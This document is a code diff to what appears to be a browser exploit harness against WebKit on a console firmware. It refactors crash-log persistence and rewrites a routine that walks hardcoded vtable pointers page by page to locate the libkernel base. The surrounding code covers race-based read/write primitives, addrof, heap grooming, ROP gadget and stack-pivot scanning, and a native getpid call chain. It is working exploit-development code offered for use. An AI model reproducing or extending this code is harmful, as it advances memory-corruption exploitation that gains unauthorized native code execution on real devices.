@@ -34,15 +34,17 @@ import {
     scanLibkernelLeakChunk,
     verifyManualLibkernelFromPtr,
     verifyManualLibkernelFromPtrLite,
+    checkPrologueAt,
+    saveLibkernelSession,
     isGetpidStub as lkIsGetpidStub,
     verifyManualLibkernel,
 } from "./libkernel_resolve.js";
+import { createCrashLog } from "./log_persist.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250829q";
+const BUILD_ID = "rw-20250829t";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
-const RESTORE_LOG = params.get("restorelog") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
 /** Scan low .text first — MOV @ +0x1f9bb; 13.00 hints @ +0x295f… are wrong on 13.52 */
 /** Scan low .text — G0-G4 live below ~0xe3e4a on 13.52 */
@@ -91,15 +93,15 @@ let raceAttempt = 0;
 let lengthMissStreak = 0;
 
 const LOG_MAX = 300;
-const PERSIST_MAX = 150;
-const SS_LOG = "wk-rw-log";
-const SS_STATE = "wk-rw-state";
-const SS_LOG_BUILD = "wk-rw-log-build";
-/** Only persist milestones — not every ATTEMPT line (sessionStorage churn OOMs) */
-const PERSIST_TAGS = /^(PRIMITIVE|PAIR|NATIVE|GADGET|PASS|FAIL|WARN|BOOT|ERROR|PROMOTE|TRIM|UA-FW|LOAD|GIVE-UP|HINT-GROOM|LOG-CLEAR|ATTEMPT-START|READ-PRIMITIVE|WEBKIT|LIBKERNEL|GETPID|BASE|ELF|CODE|SAVE|SCAN|LK-)/;
+const crashLog = createCrashLog({
+    ssLog: "wk-rw-log",
+    ssState: "wk-rw-state",
+    ssBuild: "wk-rw-log-build",
+    buildId: BUILD_ID,
+    maxLines: 200,
+});
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;
 
-let persistBuf = null;
 let raceMode = false;
 const raceBuf = [];
 
@@ -128,86 +130,18 @@ function renderOut() {
     outEl.scrollTop = outEl.scrollHeight;
 }
 
-function persistLine(tag, line) {
-    if (!PERSIST_TAGS.test(tag)) return;
-    try {
-        if (!persistBuf) {
-            persistBuf = (sessionStorage.getItem(SS_LOG) || "")
-                .split("\n").filter(Boolean);
-            while (persistBuf.length > PERSIST_MAX) persistBuf.shift();
-        }
-        persistBuf.push(line);
-        while (persistBuf.length > PERSIST_MAX) persistBuf.shift();
-        sessionStorage.setItem(SS_LOG, persistBuf.join("\n"));
-        sessionStorage.setItem(SS_LOG_BUILD, BUILD_ID);
-    } catch (_) { }
-}
-
-function persistState(msg, cls) {
-    if (busy && !/OK|FAIL|error|native|primitive|promote|broken/i.test(msg || "")) return;
-    try {
-        sessionStorage.setItem(SS_STATE, JSON.stringify({
-            msg: msg || "",
-            cls: cls || "",
-            build: BUILD_ID,
-            t: Date.now(),
-        }));
-    } catch (_) { }
-}
-
 function clearPersistedLog() {
-    persistBuf = null;
-    try {
-        sessionStorage.removeItem(SS_LOG);
-        sessionStorage.removeItem(SS_STATE);
-        sessionStorage.removeItem(SS_LOG_BUILD);
-    } catch (_) { }
-}
-
-function restorePersistedLog() {
-    try {
-        const prev = sessionStorage.getItem(SS_LOG);
-        if (!prev) return false;
-        const build = sessionStorage.getItem(SS_LOG_BUILD) || "?";
-        const st = sessionStorage.getItem(SS_STATE);
-        lines.push("=== RESTORED (prev build=" + build + ") ===");
-        for (const l of prev.split("\n")) {
-            if (l) lines.push(l);
-        }
-        lines.push("=== RELOAD build=" + BUILD_ID + " ===");
-        if (st) {
-            try {
-                const j = JSON.parse(st);
-                if (j.msg) lines.push("LAST-STATE  " + j.msg);
-            } catch (_) { }
-        }
-        return true;
-    } catch (_) {
-        return false;
-    }
-}
-
-function flushPersistMilestones() {
-    try {
-        persistBuf = [];
-        for (let i = 0; i < lines.length; i++) {
-            const line = lines[i];
-            const tag = line.split(/\s/)[0];
-            if (PERSIST_TAGS.test(tag)) persistBuf.push(line);
-        }
-        while (persistBuf.length > PERSIST_MAX) persistBuf.shift();
-        if (persistBuf.length)
-            sessionStorage.setItem(SS_LOG, persistBuf.join("\n"));
-        sessionStorage.setItem(SS_LOG_BUILD, BUILD_ID);
-    } catch (_) { }
+    crashLog.clear();
 }
 
 function mark(tag, detail) {
     const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
+    const raceCritical = /FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|ATTEMPT-START|PRIMITIVE/i.test(tag);
     if (raceMode) {
         raceBuf.push(line);
-        if (raceBuf.length > 48) raceBuf.shift();
-        if (/FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|ATTEMPT-START|PRIMITIVE/i.test(tag)) {
+        if (raceBuf.length > 64) raceBuf.shift();
+        crashLog.append(line, tag);
+        if (raceCritical) {
             lines.push(line);
             if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
             if (outEl) {
@@ -219,6 +153,7 @@ function mark(tag, detail) {
     }
     lines.push(line);
     if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
+    crashLog.append(line, tag);
     if (scanQuiet && !SCAN_MARK_TAGS.test(tag)) {
         scanRenderPending++;
         if (scanRenderPending >= 48) {
@@ -228,7 +163,6 @@ function mark(tag, detail) {
         return;
     }
     scanRenderPending = 0;
-    persistLine(tag, line);
     renderOut();
 }
 
@@ -236,7 +170,8 @@ function state(msg, cls) {
     if (!stateEl) return;
     stateEl.textContent = msg;
     stateEl.className = cls || "";
-    if (!raceMode) persistState(msg, cls);
+    if (!raceMode || /OK|FAIL|error|native|primitive|promote|broken/i.test(msg || ""))
+        crashLog.persistState(msg, cls);
 }
 
 function setUi() {
@@ -347,7 +282,21 @@ const CAL_VTABLE_PTRS = [
     { label: "vtable[11]", ptr: "83f34c110", code: "0x2184783" },
 ];
 const SS_CAL_EXT_PTRS = "wk-cal-ext-ptrs";
-const SS_CAL_PTR_I = "wk-cal-ptr-i";
+let calPtrIdx = 0;
+let calWalk = null;
+const CAL_WALK_MAX = 12;
+
+function pageAlignPtr(addr) {
+    if (!addr) return null;
+    return new int64((addr.low >>> 0) & ~0x3fff, addr.hi >>> 0);
+}
+
+function parseCalPtr(raw) {
+    const s = String(raw).replace(/^0x/i, "").trim();
+    if (!s) return null;
+    const n = BigInt("0x" + s);
+    return new int64(Number(n & 0xffffffffn), Number((n >> 32n) & 0xffffffffn));
+}
 
 function calExtPtrCandidates() {
     const out = CAL_VTABLE_PTRS.slice();
@@ -495,12 +444,7 @@ function runManualTest(testId) {
             return;
         }
         if (testId === "try-cal-ptrs") {
-            runTryCalPtrs().catch(function (err) {
-                mark("LK-FAIL", err.message || String(err));
-                busy = false;
-                setUi();
-                renderOut();
-            });
+            runTryCalPtrs();
             return;
         }
         if (testId === "stub20") {
@@ -1777,7 +1721,7 @@ async function runShowLkHints() {
 
 let leakScanState = null;
 
-async function runTryCalPtrs() {
+function runTryCalPtrs() {
     if (!ready || !window.p || busy) return;
     const p = window.p;
     const off = loadEffectiveOff();
@@ -1786,54 +1730,52 @@ async function runTryCalPtrs() {
         mark("LK-SKIP", "no webkitBase — Save bases first");
         return;
     }
-    const cands = calExtPtrCandidates();
-    if (!cands.length) {
-        mark("LK-SKIP", "no cal ptrs loaded");
+    const cands = CAL_VTABLE_PTRS;
+    if (calPtrIdx >= cands.length) {
+        calPtrIdx = 0;
+        calWalk = null;
+        mark("LK-CAL-DONE", "cycle reset — tried all " + cands.length);
+        renderOut();
         return;
     }
-    let idx = 0;
-    try {
-        idx = parseInt(sessionStorage.getItem(SS_CAL_PTR_I) || "0", 10) || 0;
-    } catch (_) { }
-    if (idx >= cands.length) {
-        mark("LK-CAL-DONE", "all " + cands.length + " tried — reload page to reset");
-        try { sessionStorage.removeItem(SS_CAL_PTR_I); } catch (_) { }
-        state("cal ptrs exhausted", "bad");
-        return;
+    const c = cands[calPtrIdx];
+    if (lines.length > 48) lines.splice(0, lines.length - 48);
+    if (!calWalk || calWalk.idx !== calPtrIdx) {
+        const fn = parseCalPtr(c.ptr);
+        calWalk = { idx: calPtrIdx, label: c.label, page: pageAlignPtr(fn), step: 0 };
     }
-    const c = cands[idx];
+    mark("LK-CAL", "build=" + BUILD_ID + " " + c.label + " walk " + calWalk.step
+        + "/" + CAL_WALK_MAX + " @ " + calWalk.page);
+    renderOut();
     busy = true;
     setUi();
-    scanQuiet = true;
-    mark("LK-CAL", "build=" + BUILD_ID + " " + (idx + 1) + "/" + cands.length
-        + " " + c.label + " " + c.ptr + " (lite ≤25 reads)");
-    if (addrIn) addrIn.value = c.ptr;
     try {
-        const v = verifyManualLibkernelFromPtrLite(p, c.ptr, off);
-        scanQuiet = false;
-        try { sessionStorage.setItem(SS_CAL_PTR_I, String(idx + 1)); } catch (_) { }
-        if (v.ok) {
-            mark("LK-OK", c.label + " → " + v.lk + " (" + (v.via || "?") + ")");
-            state("libkernel via " + c.label, "ok");
-            try { sessionStorage.removeItem(SS_CAL_PTR_I); } catch (_) { }
+        if (checkPrologueAt(p, calWalk.page)) {
+            saveLibkernelSession(calWalk.page, null);
+            mark("LK-OK", c.label + " " + c.ptr + " → " + calWalk.page + " (walk-" + calWalk.step + ")");
+            state("libkernel OK", "ok");
+            calPtrIdx++;
+            calWalk = null;
         } else {
-            mark("LK-CAL-MISS", c.label + " — " + (v.error || "not libkernel"));
-            if (idx + 1 < cands.length)
-                mark("LK-HINT", "tap Try cal ptr again (" + (idx + 2) + "/" + cands.length + ")");
-            else
-                mark("LK-CAL-DONE", "all miss — Leak+vtable LK");
-            state("miss " + c.label + " — tap again", "warn");
+            calWalk.step++;
+            if (calWalk.step >= CAL_WALK_MAX) {
+                mark("LK-CAL-MISS", c.label + " walk exhausted");
+                calPtrIdx++;
+                calWalk = null;
+                state("next ptr (" + (calPtrIdx + 1) + "/" + cands.length + ")", "warn");
+            } else {
+                calWalk.page = calWalk.page.sub32(0x4000);
+                mark("LK-CAL", "miss — tap again (same ptr, page-" + calWalk.step + ")");
+                state("tap Try cal ptr (walk " + calWalk.step + ")", "warn");
+            }
         }
     } catch (err) {
-        scanQuiet = false;
-        mark("LK-FAIL", err.message || String(err));
+        mark("LK-FAIL", String(err.message || err));
         state("cal ptr error", "bad");
-    } finally {
-        busy = false;
-        setUi();
-        renderOut();
-        flushPersistMilestones();
     }
+    busy = false;
+    setUi();
+    renderOut();
 }
 
 async function runLeakLkScan() {
@@ -1886,7 +1828,7 @@ async function runLeakLkScan() {
         leakScanState = null;
         setUi();
         renderOut();
-        flushPersistMilestones();
+        crashLog.flushSync();
     }
 }
 
@@ -2082,25 +2024,16 @@ async function runScanIat() {
 }
 
 async function ensureLibkernel(p, off, webkitBase) {
-    let r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
+    const r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
     if (r.ok) return r.lk;
-    const nativeFn = captureNativeFnQuick(p, off);
-    mark("NATIVE-STEP", "libkernel scan (GOT + stub)…");
-    let state = null;
-    let ticks = 0;
-    while (ticks++ < 80000) {
-        const chunk = scanLibkernelChunk(p, webkitBase, off, state, { nativeFn });
-        state = chunk.state;
-        if (chunk.done && chunk.lk) {
-            const iat = chunk.iatRva != null
-                ? " IAT +0x" + chunk.iatRva.toString(16) : "";
-            mark("LK-OK", chunk.lk + iat + " (" + (chunk.source || "?") + ")");
-            return chunk.lk;
+    try {
+        const raw = sessionStorage.getItem("wk-libkernelBase");
+        if (raw) {
+            const lk = parseCalPtr(raw);
+            if (lk && checkPrologueAt(p, lk)) return lk;
         }
-        if (chunk.done) break;
-        await new Promise(r => setTimeout(r, 0));
-    }
-    throw new Error("libkernel unknown — Scan libkernel or paste base in hex box");
+    } catch (_) { }
+    throw new Error("libkernel unknown — Try cal ptr or paste base in hex box");
 }
 
 function stripUiForNative() {
@@ -2162,8 +2095,7 @@ async function doNativeCallImmediate() {
         libkernelBase,
         log: mark,
         trustGadgets: true,
-        noStubScan: false,
-        stubScanMax: 0x8000,
+        noStubScan: true,
         getpidOnly: true,
     });
     nativeChain = chain;
@@ -2298,9 +2230,10 @@ async function establishOnce(establishPrimitive) {
                 if (!dup) lines.push(line);
             }
         }
+        crashLog.appendMany(raceBuf);
         raceBuf.length = 0;
         if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
-        flushPersistMilestones();
+        crashLog.flushSync();
         renderOut();
     }
 }
@@ -2372,11 +2305,9 @@ async function runStart() {
     if (busy || ready) return;
     busy = true;
     setUi();
-    lines.length = 0;
     raceBuf.length = 0;
-    if (RESTORE_LOG) restorePersistedLog();
-    else clearPersistedLog();
-    if (outEl) outEl.textContent = "";
+    crashLog.sessionMarker("START");
+    if (outEl) renderOut();
     pointers.length = 0;
     renderMap();
 
@@ -2515,17 +2446,21 @@ function init() {
     }
 
     if (params.get("clearlog") === "1") clearPersistedLog();
-    else if (RESTORE_LOG && restorePersistedLog()) renderOut();
+    else crashLog.restoreInto(lines);
 
-    mark("BOOT", "build=" + BUILD_ID + " — LK-PROBE line shows dynamic parse status");
+    crashLog.startAutoFlush();
+    mark("BOOT", "build=" + BUILD_ID + " — logs persist across reload/crash");
+    mark("BOOT", "LK-PROBE line shows dynamic parse status");
     mark("BOOT", groomBootLine(params));
     window.addEventListener("beforeunload", function () {
         stopPivotScanQuiet();
-        if (stateEl) persistState(stateEl.textContent, stateEl.className);
+        if (stateEl) crashLog.persistState(stateEl.textContent, stateEl.className, true);
+        crashLog.flushSync();
         if (nativeChain) try { nativeChain.disarm(); } catch (_) { }
     });
     wireGroomBar(() => busy);
     setUi();
+    renderOut();
     state("ready — Start → Save bases → scan/verify pivot → Native call", "");
 }
 
